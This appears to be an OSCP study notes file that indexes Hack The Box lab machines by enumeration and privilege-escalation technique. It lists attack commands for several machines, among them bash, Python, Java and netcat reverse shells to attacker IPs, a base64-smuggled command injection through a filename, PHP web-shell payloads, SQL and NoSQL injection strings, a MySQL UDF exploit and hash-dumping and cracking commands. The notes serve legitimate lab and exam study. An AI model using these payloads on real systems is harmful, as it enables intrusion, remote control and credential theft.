### AD Machines

Forest, Active, Cascade, Monteverde, Reel, Mantis, Blackfield, Search, APT, Support, Outdated, Scrambled, StreamIO, Rebound, Manager, EscapeTwo

https://twitter.com/hackthebox_eu/status/1529122562038456320?cxt=HHwWgICzhcu3xLgqAAAA

https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md

### Linux Machines

| Machine | Enumeration | Privilege Escalation |
| ------------- | ------------- | ------------- |
| Admirer | web dir enum, [Adminer](https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/) MySQL(local) | sudo list ```SETENV```, Hijacking Python Library ```PYTHONPATH``` | 
| Armageddon | Drupal [(CVE-2018-7600)](https://github.com/pimps/CVE-2018-7600), credential in config file, MySQL | sudo list, snap |
| Backdoor | wordpress LFI proc gdbserver | screen |
| *BackendTwo | API scanning, create user, analysis and modify code, auth.log | sudo list, so file ||
| Blocky | dirb javadecompilers wordpress | sudo list |
| Blunder | feroxbuster extensions ```txt``` bludit | sudo versions before 1.8.28 |
| Brainfuck | wordpress plugin smtp pop3 | Cryptography |
| Cronos | subdomain wfuzz| crontab |
| Doctor | [ssti-payloads](https://github.com/payloadbox/ssti-payloads) | Splunk |
| Forge | SSRF subdomain ftp | sudo list Python Debugger pdb |
| Forlic | playsms Ook! | BOF |
| Haircut | dirb medium.txt writeable uploads folder | Unknown SUID binary screen |
| Horizontall | wfuzz top1million-110000 strapi | active port 8000 ```local CVE``` ssh tunnel |
| Irked | irc-unrealircd-backdoor | LinPEAS Unknown SUID binary |
| *Jarvis | SQLi phpmyadmin 4.8 RCE | python command injection & systemctl binary |
| Knife | firefox wappalyzer [PHP 8.1.0](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py)| upgrade shell & sudo list |
| Lame | distccd | nmap |
| *Luanne | nmap Supervisor & robots.txt weather | BSD doas & netpgp backup file |
| Magic | [SQLi](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/) bypassing login & <br> File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass) | mysqldump & Unknown SUID binary sysinfo |
| *Mango |  certificate subdomains & <br> [enumerate](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration) credentials of nosql-injection <br> (*Not sure if you can use this script in the exam), reuse | jjs, write root SSH public key | 
| Meta | subdomain, Exiftool, python3 reverse, process, mogrify(ImageMagick) | sudo list, env_keep, Neofetch |
| Mirai | nmap, pi.hole, ssh | sudo list, mount, strings |
| MonitorsTwo | Cacti, #InfoLeakScript, MySQL, SSH | Docker, [CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091) |
| Networked | File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass), <br> php command injection | *sudo list |
| Nibbles | page source, directory | sudo list |
| *NineVeh | brute force attack http & https, phpLiteAdmin | crontab, chkrootkit |
| Noter | Flask cookie (flask-unsign), ftp credentials, [md-to-pdf package, CVE-2021-23639](https://redteamnation.com/mysql-user-defined-functions/) | [MySQL UDF](https://redteamnation.com/mysql-user-defined-functions/) |
| OpenAdmin | OpenNetAdmin, pwd in conf file & <br> reverse proxy, cracking passphrase | sudo list, GTFO |
| OpenSource | Flask debugger PIN, Gitea, `.git` hide information | process git commit |
| *Ophiuchi | [Java-Deserialization](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet), SnakeYAML | sudo list, analysis of GO code |
| Passage | CutePHP & password storage location & <br> base64 & cracking | *SUID dbus |
| *Pit | SNMP enum, hide web folder, SeedDMS | NET-SNMP-EXTEND-MIB, monitoring |
| *Poison | LFI, FreeBSD Apache log poisoning | password base64, vncviewer |
| Popcorn | torrent, upload bypass | user cache, motd, Linux PAM | 
| Postman | Redis, ssh, john | [Webmin](https://github.com/KrE80r/webmin_cve-2019-12840_poc) |
| Precious | pdfkit, ruby, plain text password | sudo list, *YAML Deserialization ||  
| Previse | HTTP [302](https://vk9-sec.com/bypass-30x-redirect-with-burpsuite/), PHP exec, mysql, hashcat 500 | sudo list, [$PATH variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) |
| Ready | [gitlab](https://github.com/dotPY-hax/gitlab_RCE) | *[Escaping Docker](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounting-disk-poc2) (mounting-disk-poc2), SSH |
| *RedPanda | [SSTI payload](https://github.com/VikasVarshney/ssti-payload)($→*, selection expressions), msfvenom (wget) | jar (pspy process), XML, [XXE](https://www.youtube.com/watch?v=gjm6VHZa_8s), SSH |
| ScriptKiddie | *[APK](https://www.exploit-db.com/exploits/49491)(No need for msfvenom but be careful choosing payload), <br>shell script, command injection (cut) | sudo list |
| Seal | manager, *403 Fuzz, 401, credential in commit history, <br> opt, symbolic link, ssh | sudo list |
| Sense | feroxbuster extensions ```txt``` medium.txt, pfsense RCE | no need |
| *Shared | Cookie-based SQL Injection, user table, SSH, [IPython](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x) CVE-2022-21699 | Redis |
| Shibboleth | wfuzz, udp, IPMI, hashcat 7300, <br> zabbix RCE, password reuse | [MariaDB](https://www.exploit-db.com/exploits/49765) |
| Shocker | [ShellShock](https://nvd.nist.gov/vuln/detail/cve-2014-6271), ```403``` permission directory, extensions ```sh``` ```pl``` | sudo list |
| Shoppy | NoSQL injection, subdomain(bitquark list), SSH | sudo list, cat and analysis script, [docker group](https://gtfobins.github.io/gtfobins/docker/) |
| SneakyMailer | subdomain(wfuzz), *credential phishing(email, nc), ftp, <br> *PyPI malicious package | sudo list |
| SolidState | Apache James 2.3.2, *reset user password, POP3, <br> trigger by ssh login | task, file permission |
| Squashed | nfs, mount permission, change userid, web folder | MIT-magic-cookie-1, Xauthority |
| Sunday | finger enum [users](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt), SSH, backup folder, hashcat 7400 | sudo list (wget) |
| SwagShop | Magento CVE-2015-1397 | sudo list (vi) |
| Tabby | LFI, tomcat-users.xml, page source, remote deploy, <br> file password | [lxd](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) |
| TartarSauce | web dir enum, wordpress plugins, <br> CVE-2015-8351 (plugin real version), sudo list (tar) | *backuperer.service (System timers) |
| Time | *Jackson (CVE-2019-12384), Java-Deserialization | timer_backup.service (System timers) |
| Traverxec | Nostromo, [HOMEDIRS](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd#HOMEDIRS) (www_public), hidden folder in user's folder, cracking passphrase (e.g., OpenAdmin box)  | ```/etc/sudoers```, journalctl without PIPE, <br> resize (e.g., less, vi) |
| Trick | reverse DNS lookup, another subdomain, SQLi default Nginx<br> sites-available configuration file, [LFI](https://github.com/tedchen0001/OSCP-Notes/blob/master/file_inclusion.md), SSH key | [fail2ban](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7) (group permission) |
| UpDown | *web dir enum, .git directory, subdomain, ```.htaccess(Required-Header)```, <br>[proc_open](https://www.php.net/manual/en/function.proc-open.php) (PHP), PHP phar, python inject commands | sudo list |
| Valentine | web dir enum, Heartbleed [poc](https://github.com/sensepost/heartbleed-poc), decrypt RSA private key | tmux |
| *Writer | web dir enum, SQL injection ```LOAD_FILE with LFI list```, <br>Python source code analysis ```(__init__.py)```, Django hash | postfix(disclaimer), apt-get update process |

(*):review before the exam

### Windows Machines

| Machine | Enumeration | Privilege Escalation | AD |
| ------------- | ------------- | ------------- | :-----------: |
| Active | Groups.xml | Kerberoasting | :white_check_mark: |
| *APT | MS-RPC port 135, [IOXID resolver](https://github.com/mubix/IOXIDResolver), IPv6, share file, AD database file, <br> [dump hashes](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py), valid usernames, [modify registry](https://github.com/SecureAuthCorp/impacket/blob/master/examples/reg.py) | [responder](https://github.com/SpiderLabs/Responder), NTLMv1 Hash | :white_check_mark: |
| Arctic | Adobe ColdFusion 8 | MS10-059(wait for the exploit to take effect) ||
| Atom | smb pdf, unzip exe file, autoUpdater, Electron-Updater, YAML | PortableKanban ||
| *Bankrobber | XSS, SQLi, Arbitrary File Read | [forwarding service](https://github.com/jpillora/chisel), BOF ||
| Bastard | Drupal 7 CVE-2018-7600 | MS10-059, MS15-051 ||
| Bastion | mount vhd, SYSTEM SAM user hash | mRemoteNG || 
| Blue | MS17-010 | no need ||
| Bounty | File upload bypass, [web.config](https://github.com/tedchen0001/OSCP-Notes/blob/master/Windows/File_Upload_Bypass.md) | [SeImpersonatePrivilege](https://github.com/tedchen0001/OSCP-Notes/blob/master/Windows/Privilege/SeImpersonatePrivilege.md) ||
| Buff ||||
| Cascade | ldap hidden information, smb share, VNC password, user share DB file | AD Recycle Bin | :white_check_mark: |
| Chatterbox | Achat | AutoLogon credentials, reuse password, powershell reverse (with credential) ||
| Conceal | SNMP, *IPsec VPN, FTP (IIS folder), Classic ASP | [SeImpersonatePrivilege](https://github.com/tedchen0001/OSCP-Notes/blob/master/Windows/Privilege/SeImpersonatePrivilege.md) ||
| Devel | FTP, IIS folder | [SeImpersonatePrivilege](https://github.com/tedchen0001/OSCP-Notes/blob/master/Windows/Privilege/SeImpersonatePrivilege.md) ||
| Forest ||||
| Fuse | username(from website), create password(cewl --with-numbers), smbpasswd, enumprinters(rpcclient) | [SeLoadDriverPrivilege](https://github.com/tedchen0001/OSCP-Notes/blob/master/Windows/Privilege/SeLoadDriverPrivilege.md), zerologon | :white_check_mark: |
| Grandpa | Windows Server 2003, IIS WebDAV CVE-2017-7269 | WMI Service Isolation Privilege Escalation (churrasco) ||
| Granny | Windows Server 2003, IIS WebDAV CVE-2017-7269 | WMI Service Isolation Privilege Escalation (churrasco) ||
| *Intelligence | username(pdf creator), add AD Integrated DNS records  | group ReadGMSAPassword | :white_check_mark: |
| Jerry | Tomcat default credential, deploy | no need ||
| Legacy | MS08-067, MS17-010 | no need ||
| Love | SSRF Gopher MySQL | AlwaysInstallElevated ||
| Object ||||
| Omni | IoT exploit | *SAM SYSTEM hash, Export-Clixml, GetNetworkCredential ||
| Optimum | HttpFileServer 2.3 | MS16-098 ||
| Outdated | [CVE-2022-30190](https://github.com/JohnHammond/msdt-follina) (pdf), AddKeyCredentialLink, <br>(bloodhound, Evil-WinRM) | [WSUS](https://github.com/nettitude/SharpWSUS) | :white_check_mark: |
| Reel | sendemail, RTF, HTA |||
| Remote | NFS Service(default port 2049), mount, sdf, Umbraco CMS | SeImpersonatePrivilege, TeamViewer |
| *Resolute | RPC enumeration, password spray, hidden folder, scripts | DNSAdmins | :white_check_mark: | 
| *Scrambled | website leak information (user and password), Ticket, SPN, <br>ticketer.py (500 Administrator), sql query user info, <br>xp_cmdshell, PowerShell run as different user | dll [(.NET Decompiler)](https://github.com/icsharpcode/ILSpy), [.NET object deserialization](https://github.com/pwntester/ysoserial.net) | :white_check_mark: |
| *Search | enumrate username(website image leaks info), kerberoast, unzip xlsx | pfx, web dir, GMSA user, GenericAll | :white_check_mark: |
| SecNotes | CSRF reset password link, smb, IIS php | WinPEAS Linux shells/distributions ||
| Servmon | FTP, NVMS LFI, SSH | NSClient, *SSH tunnel (localhost services) ||
| Silo | Oracle (default port 1521), CVE-2012-1675, ODAT, brute-force | Oracle, SYSTEM Privilege ||
| *StreamIO | subdomain, SQLi, wfuzz(parameter, cookie), LFI(php://filter), page uses eval | [forwarding service](https://github.com/jpillora/chisel), SQL Server 1433, [firefox credentials](https://github.com/lclevy/firepwd), bloodhound analysis, <br>Add-DomainObjectAcl(add member to group), ReadLAPSPassword | :white_check_mark: |
| Support | disassemble(.Net), LDAP, user information | DACL abuse, GenericAll | :white_check_mark: |
| Worker | SVN(default port 3690), revision, Azure DevOps,  new branch, <br>additional drives, evil-winrm | Azure DevOps, PowerShell task ||

(*):review before the exam

### Additional command notes

Used in ```Admirer```

```
sudo PYTHONPATH=/tmp/ <full path of a script file>
```

Used in ```Knife``` for upgrade shell

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'
```

Used in ```Luanne``` 

authenticate

```
curl -s http://127.0.0.1:3001/<folder>/ -u <user>:<password>
```

find the open ports

```
netstat -punta || ss -nltpu || netstat -anv
```

Used in ```Magic``` 

image file upload bypass

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
```

dump mysql database data without using mysql client tool

```
mysqldump -u root -p database_name > database_name.sql
```

Used in ```Mango```

[nosql-injection](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/nosql-injection.md): basic authentication bypass

```
# change post data
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

Used in ```Mirai```

```
# check partition
strings /dev/sdb
```

Used in ```Networked```

command injection

```
# method1: vaild file name
echo "" > "; nc -c bash 192.168.0.1 4444 ;"
# method2: use base64 encoding format to avoid file name checking
echo nc -e /bin/bash 192.168.0.1 4444 | base64 -w0
echo "" > "a; echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMC4xIDQ0NDQK | base64 -d | sh; b"
```

[base64](https://linux.die.net/man/1/base64)

```
-w, --wrap=COLS
    Wrap encoded lines after COLS character (default 76). Use 0 to disable line wrapping.
-d, --decode
    Decode data.
-i, --ignore-garbage
    When decoding, ignore non-alphabet characters.
--help
    display this help and exit
--version
    output version information and exit
```

Used in ```Nineveh```

```
# check information in image file
strings -n 20 <image file> 
# extract known file types 
binwalk <image file>
binwalk -e <image file>
```

Used in ```OpenAdmin```

find files containing specific text e.g. password

```
find / -type f \( -iname \*.php -o -iname \*.config -o -iname \*.conf -o -iname \*.ini -o -iname \*.txt \) -exec grep -i 'password\|passwd' {} \; -print 2>&-
```

crack SSH private key passphrase

```
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash -wordlist=rockyou.txt
```

Used in ```Ophiuchi```

one line reverse shell command in Java

```Java
String[] cmdline = { "sh", "-c", "echo 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && bash /tmp/revshell.sh" }; 
Runtime.getRuntime().exec(cmdline);
```

Used in ```Pit```

```
# crack SNMP passwords
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt -p <target port> <target ip>
```

```
snmpwalk -v1 -c public <target ip> .
# -v 1|2c|3 SNMP version
# -c community string, like a password
# . [OID]
```
get file access control lists

```
getfacl /usr/local/monitoring
```

Used in ```Tabby```

```shell
# create reverse shell
msfvenom -p java/shell_reverse_tcp lhost=<attacker ip> lport=<attacker port> -f war -o shell.war
# Tomcat role admin, manager and manager-script can remote deploy 
curl -v -u 'tomcat:<password>' --upload-file shell.war "http://<target ip>:<port>/manager/text/deploy?path=/test&update=true"
# trigger
curl http://<target ip>:<port>/test/
# crack zip file password
zip2john <file> > hash
john --wordlist=<password_list> hash       
```

Used in ```TartarSauce```

```shell
wpscan --url http://<target ip>/ -e ap --plugins-detection aggressive --api-token <api_key> -t 20 --verbose
# --api-token:display vulnerability data (not always necessary), register a uesr and get the api key from wpscan offical website
```

Used in ```Time```

```shell
# privilege escalation by using task script 
echo 'cp /bin/sh /tmp/sh;chmod u+s /tmp/sh' > <task script file>
# execute
/tmp/sh -p
# -p priviliged
```

Used in ```Valentine```

```shell
# check heartbleed vulnerability with Nmap NSE script
nmap --script=ssl-heartbleed -p <target port> <target ip>
```

```ssh-rsa``` turned off by default

```shell
# sign_and_send_pubkey: no mutual signature supported
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa <user>@<target ip> -i <private_key>
```

```shell
# hijacking tmux sessions for Privilege Escalation 
/usr/bin/tmux -S /.devs/dev_sess
```

Used in ```APT```

port 135 MSRPC

[rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)

[Windows DCOM version 5.6](https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/)

```shell
# mappings of RPC
python3 rpcdump.py <target ip> -p 135
# enumerating network interface, Windows DCOM version 5.6
python3 IOXIDResolver.py <target ip>
# Nmap IPv6 scan
nmap -6 -p- --min-rate 1000 <target IPv6 address>
# enumerating information from Samba systems
python3 enum4linux-ng.py -A -C <target IPv6 address>
# list all files from all readable shares
crackmapexec smb <target IPv6 address> -u '' -p '' -M spider_plus
```

Used in ```Bankrobber```

```sql
/* load file */
x' UNION SELECT 1, LOAD_FILE('C:\Windows\System32\drivers\etc\hosts'),3-- - 
```

[TCP/UDP tunnel over HTTP](https://github.com/jpillora/chisel)


Used in ```Bastion```

```shell
sudo mkdir /mnt/bastion
sudo mount -t cifs -o username=NULL //<target ip>/Backups/WindowsImageBackup  /mnt/bastion -o rw
mkdir /tmp/vhd
guestmount --add "/mnt/bastion/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /tmp/vhd -v
cd /tmp/vhd/Windows/System32/config/
# using two file SYSTEM and SAM to dump the hashes
samdump2 SYSTEM SAM > /tmp/hashes.txt
# If the hashes exported by samdump2 seem unusual
python3 secretsdump.py -system SYSTEM -sam SAM LOCAL
# crack user password hash
hashcat -m 1000 user_hash.txt <password_list.txt>
```

Used in ```Chatterbox```

```cmd
REM create payload
msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
REM change user, password and payload
powershell -c "$password = ConvertTo-SecureString '<password>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<user>', $password);Start-Process -FilePath "<payload>" -Credential $creds"
```

Used in ```Conceal```

```
sudo ipsec restart
```

[SeImpersonatePrivilege](https://github.com/tedchen0001/OSCP-Notes/blob/master/Windows/Privilege/SeImpersonatePrivilege.md)

Used in ```Grandpa```

```
churrasco.exe "nc.exe -e cmd.exe <attacker ip> <attacker port>"
```

Used in ```Jerry```

```
https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
```

Used in ```Legacy```

https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py

attacker 

```shell
# Windows XP SP3 English (NX) = 6
python2 ms08-067.py <target ip> 6 <target port>
python2 smbserver.py <shareName> /usr/share/windows-resources/binaries/
```

target

```cmd
copy \\<attacker ip>\<shareName>\whoami.exe C:\windows\temp
```

Used in ```Love```

SSRF payload

https://github.com/tarunkant/Gopherus

```mysql
select '<?php system($_GET[\'cmd\']); ?>' INTO OUTFILE 'C:\\xampp\\htdocs\\omrs\\admin\\test.php';
```

[AlwaysInstallElevated](https://github.com/tedchen0001/OSCP-Notes/tree/master/Windows/Privilege)

```shell
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f msi -o reverse.msi
```

```powershell
msiexec /quiet /qn /i <payload>
```

Used in ```Omni```

[SirepRAT.py](https://github.com/SafeBreach-Labs/SirepRAT)

```
python SirepRAT.py <target ip> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c     Powershell Invoke-WebRequest -OutFile C:\Data\Users\DefaultAccount\Documents\nc64.exe -Uri http://<attacker ip>/nc64.exe "
```

Used in ```Remote```

NFS Service

```shell
showmount -e <target ip>
mkdir /tmp/test_folder
sudo mount -t nfs <target ip>:/<folder> /tmp/test_folder -o nolock
```

Used in ```Silo```

[ODAT(Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)

```shell
# searching valid SIDs
python3 odat.py sidguesser -s <target ip> --sids-file=./resources/sids.txt
# using default list (accounts/accounts.txt) to execute brute-force attacks
python3 odat.py passwordguesser -s <target ip> -d <sid> -vvv
# upload reverse shell payload 
python3 odat.py utlfile -s <target ip> -p <target port> -U <username> -P <password> -d <sid> --sysdba --putFile c:/ shell-x64.exe /tmp/shell-x64.exe
# execute reverse shell payload
python3 odat.py externaltable -s <target ip> -p <target port> -U <username> -P <password> -d <sid> --sysdba --exec c:/ shell-x64.exe
```

Used in ```Scrambled```

```shell
python3 getTGT.py scrm.local/ksimpson:ksimpson -k -dc-ip 10.10.11.168
export KRB5CCNAME=ksimpson.ccache
klist
python3 GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168 -dc-host dc1.scrm.local -k -request
# -k Use Kerberos authentication 
```

host machine

```cmd
 .\hashcat.exe -m 13100 .\hash .\rockyou.txt
```

Used in ```StreamIO```

```mssql
/* testing, the order of the movie list is different */
';--
/* check version */
' UNION SELECT 1, SELECT @@VERSION), 3, '4', '5', '6';--
/* show all databases, version >= SQL Server 2017 */
' UNION SELECT 1, (SELECT STRING_AGG(name, ',') FROM sys.sysdatabases), 3, '4', '5', '6' ;--
/* show all databases, version < SQL Server 2017 */
' UNION SELECT 1,(STUFF((SELECT ',' + name FROM sys.sysdatabases FOR XML PATH('')), 1, 1, '')), 3, '4', '5', '6';--
/* show all tables */
' UNION SELECT 1, (SELECT STRING_AGG(TABLE_NAME, ',') FROM STREAMIO.INFORMATION_SCHEMA.TABLES), 3, '4', '5', '6';--
/* show all columns */
' UNION SELECT 1, (SELECT STRING_AGG(COLUMN_NAME, ',') FROM STREAMIO.INFORMATION_SCHEMA.COLUMNS), 3, '4', '5', '6';--
/* get the usernames and passwords */
' UNION SELECT 1, (SELECT STRING_AGG(username, ',') + STRING_AGG(password, ',') FROM STREAMIO.dbo.users), 3, '4', '5', '6';--
```

find parameter

```
wfuzz -H 'Cookie: PHPSESSID=<PHPSESSID>' -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw <value>
```

Used in ```Trick```

```
dig axfr @<target ip> <domain>
```

Used in ```Shoppy```

NoSQL injection payload

```shell
/home/jaeger/ShoppyApp/index.js
```

```NoSQL
admin' || '1==1
```

DNS list

```
wfuzz -H 'Host: FUZZ.shoppy.htb' -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hw 11
```

Used in ```Writer```

```
wfuzz -z file,/tmp/file_inclusion_linux.txt -d "uname=admin' union select 1,LOAD_FILE('FUZZ'),3,4,5,6; -- -&password=1234" --hw 89 http://writer.htb/administrative
```

Used in ```Noter```

```shell
# cannot import name 'json' from 'itsdangerous'
pip install Flask==2.0.1
```

```shell
# If the generated cookie does not work, note the system time in the VM.
# decode cookie
flask-unsign --decode --cookie "<cookie>"
# brute forcing secret key
flask-unsign --unsign --cookie "<cookie>" --wordlist ~/Documents/rockyou.txt --no-literal-eval
# create session 
flask-unsign --sign --cookie "{'logged_in': True, 'username': '<username>'}" --secret <keystring>
```

MySQL UDF

[resources](https://redteamnation.com/mysql-user-defined-functions/)

```shell
# attacker pc 
wget http://0xdeadbeef.info/exploits/raptor_udf2.c

# target host
cd /tmp
wget http://<attacker ip>:<attacker port>/raptor_udf2.c
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

mysql -u root -p
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
# show plugin folder path
show variables like '%plugin%';
# change plugin path
# e.g., select * from foo into dumpfile "/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so";
select * from foo into dumpfile "<plugin folder path>/raptor_udf2.so";
create function do_system returns integer soname 'raptor_udf2.so';
# check loading
select * from mysql.func;
# chagne reverse shell command
select do_system('echo ''/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh');
```

Used in `Armageddon`

```shell
# In web shell (non-tty-shell) we need to run a single query from the command line.
mysql -u "<username>" -h "localhost" "<passowrd>" "<database>" -e "<sql command>"
```

Used in `BackendTwo` 

for API testing 

https://github.com/assetnote/kiterunner

```shell
./kr scan http://<target ip>/api/ -w ~/Documents/routes-large.kite -x 20
curl -X POST -v 'http://10.10.11.162/api/v1/user/signup' --header 'content-type: application/json' -d '{"email":"123@123.com","password":"1234"}' | jq .
curl -X POST -v 'http://10.10.11.162/api/v1/user/login' -d 'username=123@123.com&password=1234'
```

- SSRF

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

```
http://0000::1:80/
```

Used in `Precious` 

YAML Deserialization

```
https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/
```

Used in `Search`

```
crackpkcs12 -d ~/Documents/rockyou.txt staff.pfx
```

Used in `Meta`

```python3
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.14", 4444))
dup2(s.fileno(), 0)
dup2(s.fileno(), 1)
dup2(s.fileno(), 2)
run(["/bin/bash", "-i"])
```

Used in `Zipping`

[Symlinks](https://infosecwriteups.com/zippy-challenge-writeup-cyberhack-ctf-80eb1d422249)

(It's not a necessity, but we can still learn about new concepts.)

```
ln -s ../../../../../../../etc/passwd test.pdf
zip --symlinks test.zip test.pdf
```

